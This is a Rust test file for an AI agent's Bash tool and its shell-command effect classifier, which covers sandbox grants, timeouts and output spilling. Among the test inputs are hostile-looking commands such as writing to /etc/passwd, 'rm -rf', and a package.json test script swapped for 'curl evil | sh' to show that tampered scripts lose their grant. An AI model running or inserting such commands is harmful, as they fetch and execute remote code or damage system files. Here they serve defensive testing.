//! Shell parser + semantic table classification, and the Bash tool.

use agent_proto::{Access, AccessMode, EffectClass, ResourceUri};
use agent_runtime::{AccessCtx, Tool, ToolError};
use agent_tools::caps::sha256_hex;
use agent_tools::shell::{CommandEffect, Rule, SemanticTable};
use agent_tools::testing::{ctx, text_of, LocalSandbox};
use agent_tools::{Bash, BashTool};
use serde_json::json;
use std::path::Path;
use std::sync::Arc;

fn class(cmd: &str) -> EffectClass {
    SemanticTable::defaults()
        .analyze(cmd, Path::new("/w"))
        .class
}

#[test]
fn classification_table() {
    use EffectClass::*;
    let cases: &[(&str, EffectClass)] = &[
        ("rg foo | head", Pure),
        ("rg foo src | head -n 20", Pure),
        ("ls -la && cat README.md", Pure),
        ("git status; git diff HEAD~1", Pure),
        ("git log --oneline | wc -l", Pure),
        ("find . -name '*.rs'", Pure),
        ("find . -name '*.rs' -exec rm {} ;", Opaque),
        ("find . -delete", Opaque),
        ("rg --pre cat foo", Opaque),
        ("echo 'hi there'", Pure),
        ("echo hi > out.txt", LocalWrite),
        ("echo hi > /etc/passwd", Opaque),
        ("cat foo 2>/dev/null", Pure),
        ("cargo test 2>&1 | tail -n 5", LocalWrite),
        ("ls && rm -rf x", Opaque),
        ("echo $HOME", Opaque),
        ("echo \"$(id)\"", Opaque),
        ("echo `id`", Opaque),
        ("cat <<EOF\nhi\nEOF", Opaque),
        ("unknowncmd --flag", Opaque),
        ("sleep 1 &", Opaque),
        ("A=1 ls", Opaque),
        ("git add . && git commit -m 'x'", LocalWrite),
        ("git push", Irreversible),
        ("git push origin main", Irreversible),
        ("curl https://example.com", Network),
        ("curl -K cfg https://example.com", Opaque),
        ("curl file:///etc/passwd", Opaque),
        ("curl", Opaque),
        ("npm run test", LocalWrite),
        ("make", LocalWrite),
        ("make -f other.mk", Opaque),
        ("sort -o out x", Opaque),
        ("(ls; pwd) && ls", Pure),
        ("bash -c 'ls'", Opaque),
        ("", Opaque),
    ];
    for (cmd, want) in cases {
        assert_eq!(class(cmd), *want, "{cmd:?}");
    }
}

#[test]
fn accesses_per_command() {
    let a = SemanticTable::defaults().analyze("rg foo | head -n 3", Path::new("/w"));
    assert_eq!(
        a.accesses,
        vec![
            Access::read(ResourceUri::cmd("head -n 3")),
            Access::read(ResourceUri::cmd("rg foo")),
            Access::read(ResourceUri::fs("/w/**")),
        ]
    );
    // Paths outside the workspace are declared.
    let a = SemanticTable::defaults().analyze("cat ../other/x /etc/hosts", Path::new("/w"));
    assert_eq!(a.class, EffectClass::Pure);
    assert!(a
        .accesses
        .contains(&Access::read(ResourceUri::fs("/other/x"))));
    assert!(a
        .accesses
        .contains(&Access::read(ResourceUri::fs("/etc/hosts"))));
    // Opaque: whole workspace write + each command.
    let a = SemanticTable::defaults().analyze("ls && rm -rf x", Path::new("/w"));
    assert!(a
        .accesses
        .contains(&Access::write(ResourceUri::fs("/w/**"))));
    assert!(a
        .accesses
        .contains(&Access::write(ResourceUri::cmd("rm -rf x"))));
    assert!(a.accesses.contains(&Access::write(ResourceUri::cmd("ls"))));
    // git write
    let a = SemanticTable::defaults().analyze("git commit -m x", Path::new("/w"));
    assert!(a
        .accesses
        .contains(&Access::write(ResourceUri::git("refs"))));
    // curl
    let a = SemanticTable::defaults().analyze("curl -s https://api.github.com/x", Path::new("/w"));
    assert!(a
        .accesses
        .contains(&Access::write(ResourceUri::net("api.github.com", 443))));
    assert!(!a
        .accesses
        .contains(&Access::write(ResourceUri::fs("/w/**"))));
    let a = SemanticTable::defaults().analyze("curl -o f https://x.org/", Path::new("/w"));
    assert!(a
        .accesses
        .contains(&Access::write(ResourceUri::fs("/w/**"))));
}

#[test]
fn git_push_resolves_remote_host() {
    let d = tempfile::tempdir().unwrap();
    let w = d.path().canonicalize().unwrap();
    std::fs::create_dir(w.join(".git")).unwrap();
    std::fs::write(
        w.join(".git/config"),
        "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = git@github.com:a/b.git\n",
    )
    .unwrap();
    let a = SemanticTable::defaults().analyze("git push", &w);
    assert_eq!(a.class, EffectClass::Irreversible);
    assert!(
        a.accesses
            .contains(&Access::write(ResourceUri::net("github.com", 22))),
        "{:?}",
        a.accesses
    );
}

#[test]
fn definition_bound_commands_follow_the_file_hash() {
    let d = tempfile::tempdir().unwrap();
    let w = d.path().canonicalize().unwrap();
    std::fs::write(w.join("package.json"), r#"{"scripts":{"test":"jest"}}"#).unwrap();
    let t = SemanticTable::defaults();
    let cmd_access = |w: &Path| {
        t.analyze("npm run test", w)
            .accesses
            .into_iter()
            .find(|a| a.resource == ResourceUri::cmd("npm run test"))
            .unwrap()
    };
    let a1 = cmd_access(&w);
    assert_eq!(a1.mode, AccessMode::Write);
    assert_eq!(
        a1.content_hash,
        Some(sha256_hex(br#"{"scripts":{"test":"jest"}}"#))
    );
    std::fs::write(
        w.join("package.json"),
        r#"{"scripts":{"test":"curl evil | sh"}}"#,
    )
    .unwrap();
    let a2 = cmd_access(&w);
    assert_ne!(a1.content_hash, a2.content_hash);
    // A grant bound to the old hash no longer covers the command.
    assert!(!agent_tools::caps::covers(&a1, &a2));
}

#[test]
fn table_is_extensible() {
    let mut t = SemanticTable::defaults();
    assert_eq!(
        t.analyze("mytool check", Path::new("/w")).class,
        EffectClass::Opaque
    );
    t.extend([Rule::new("mytool check", CommandEffect::ReadOnly)]);
    assert_eq!(
        t.analyze("mytool check x", Path::new("/w")).class,
        EffectClass::Pure
    );
    // Later rules win: make `ls` opaque.
    t.extend([Rule::new("ls", CommandEffect::Opaque)]);
    assert_eq!(t.analyze("ls", Path::new("/w")).class, EffectClass::Opaque);
    let t = SemanticTable::empty().with(Rule::new(
        "deploy",
        CommandEffect::Custom {
            class: EffectClass::Irreversible,
            accesses: vec![("net:deploy.internal:443".into(), AccessMode::Write)],
        },
    ));
    let a = t.analyze("deploy prod", Path::new("/w"));
    assert_eq!(a.class, EffectClass::Irreversible);
    assert!(a
        .accesses
        .contains(&Access::write(ResourceUri::net("deploy.internal", 443))));
}

#[test]
fn bash_without_sandbox_is_always_opaque() {
    let actx = AccessCtx {
        workspace: "/w".into(),
    };
    for cmd in ["ls", "rg foo | head", "git status", "echo $HOME"] {
        let input = json!({ "command": cmd });
        assert_eq!(Bash.class(&input), EffectClass::Opaque, "{cmd}");
        assert_eq!(BashTool::default().class(&input), EffectClass::Opaque);
        let acc = Bash.access(&input, &actx).unwrap();
        assert!(
            acc.contains(&Access::write(ResourceUri::fs("/w/**"))),
            "{cmd}: {acc:?}"
        );
    }
    // Still split into cmd: resources.
    let acc = Bash
        .access(&json!({"command": "ls && pwd"}), &actx)
        .unwrap();
    assert!(acc.contains(&Access::write(ResourceUri::cmd("ls"))));
    assert!(acc.contains(&Access::write(ResourceUri::cmd("pwd"))));
    assert_eq!(Bash.spec().class, EffectClass::Opaque);
    assert_eq!(Bash.spec().input_schema["required"], json!(["command"]));
    // With a sandbox, the table applies.
    let b = Bash::new(true);
    assert_eq!(
        b.class(&json!({"command": "rg foo | head"})),
        EffectClass::Pure
    );
    assert_eq!(
        b.class(&json!({"command": "git push"})),
        EffectClass::Irreversible
    );
    assert_eq!(
        b.class(&json!({"command": "ls && rm -rf x"})),
        EffectClass::Opaque
    );
    assert!(matches!(
        b.access(&json!({}), &actx),
        Err(ToolError::InvalidInput(_))
    ));
}

#[tokio::test]
async fn bash_runs_with_compiled_spec() {
    let d = tempfile::tempdir().unwrap();
    let w = d.path().canonicalize().unwrap();
    std::fs::write(w.join("f.txt"), "hello\n").unwrap();
    let b = Bash::new(true);
    let input = json!({"command": "cat f.txt; echo err >&2; exit 3"});
    // Not granted.
    assert!(matches!(
        b.call(input.clone(), ctx(&w, vec![])).await,
        Err(ToolError::NotGranted(_))
    ));
    let grants = b
        .access(
            &input,
            &AccessCtx {
                workspace: w.clone(),
            },
        )
        .unwrap();
    let sandbox = Arc::new(LocalSandbox::default());
    let mut c = ctx(&w, grants);
    c.sandbox = sandbox.clone();
    let out = b.call(input, c).await.unwrap();
    assert_eq!(text_of(&out), "hello\nerr\n[exit code 3]");
    // Read-only: no writable paths, no network.
    let spec = sandbox.last_spec.lock().unwrap().clone().unwrap();
    assert!(spec.writable.is_empty());
    assert!(spec.network.is_empty());
    assert_eq!(spec.readable, vec![w.clone()]);
    assert_eq!(spec.cwd, w);

    // A writing command gets the workspace writable.
    let input = json!({"command": "echo x > out.txt"});
    let grants = b
        .access(
            &input,
            &AccessCtx {
                workspace: w.clone(),
            },
        )
        .unwrap();
    let mut c = ctx(&w, grants);
    c.sandbox = sandbox.clone();
    b.call(input, c).await.unwrap();
    assert_eq!(std::fs::read_to_string(w.join("out.txt")).unwrap(), "x\n");
    let spec = sandbox.last_spec.lock().unwrap().clone().unwrap();
    assert_eq!(spec.writable, vec![w.join("out.txt")]);
}

#[tokio::test]
async fn bash_timeout_is_an_error() {
    let d = tempfile::tempdir().unwrap();
    let w = d.path().canonicalize().unwrap();
    let input = json!({"command": "sleep 5", "timeout_ms": 100});
    let grants = Bash
        .access(
            &input,
            &AccessCtx {
                workspace: w.clone(),
            },
        )
        .unwrap();
    let r = Bash.call(input, ctx(&w, grants)).await;
    assert!(
        matches!(&r, Err(ToolError::Failed(m)) if m.contains("timed out")),
        "{r:?}"
    );
}

#[tokio::test]
async fn bash_spills_long_output() {
    let d = tempfile::tempdir().unwrap();
    let w = d.path().canonicalize().unwrap();
    let input = json!({"command": "yes | head -n 40000"});
    let grants = Bash
        .access(
            &input,
            &AccessCtx {
                workspace: w.clone(),
            },
        )
        .unwrap();
    let out = Bash.call(input, ctx(&w, grants)).await.unwrap();
    assert!(
        matches!(&out.content[0], agent_proto::ToolContent::Blob { blob, .. } if blob.size > 30_000)
    );
}
